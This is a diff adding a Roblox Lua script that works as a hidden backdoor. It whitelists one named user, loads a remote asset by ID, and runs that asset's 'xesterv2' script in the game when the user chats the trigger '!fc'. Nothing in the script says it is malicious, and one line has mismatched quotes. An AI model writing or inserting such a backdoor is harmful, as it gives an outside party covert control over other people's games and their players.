@@ -1,0 +1,40 @@
+local whitelist = {"0xb53"}
+local model = game:GetObjects("rbxassetid://9598883535")
+function Execute(scr)
+local script = scr:Clone()
+for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+if table.find(whitelist,v.Name) then
+if not v:FindFirstChild("PlayerGui") then
+Instance.new("Folder",v).Name = "PlayerGui"
+Instance.new("Folder",v).Name = "PlayerScripts"
+end
+end
+end
+script.Parent = workspace
+end
+for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+if table.find(whitelist,v.Name) then
+v.Chatted:Connect(function(n)
+if n == "!fc" then
+Execute(model.xesterv2)
+end
+end)
+end
+end
+game:GetService("Players").PlayerAdded:Connect(function(v)
+if table.find(whitelist,v.Name) then
+v.Chatted:Connect(function(n)
+if n == "!fc" then
+Execute(model.xesterv2)
+end
+end)
+end
+end)
+wait(1)
+for i,v in pairs(game:GetService("Players'):GetDescendants()) do
+pcall(function()
+if v.Text:match"!fc" then
+Execute(model.xesterv2)
+end
+end)
+end
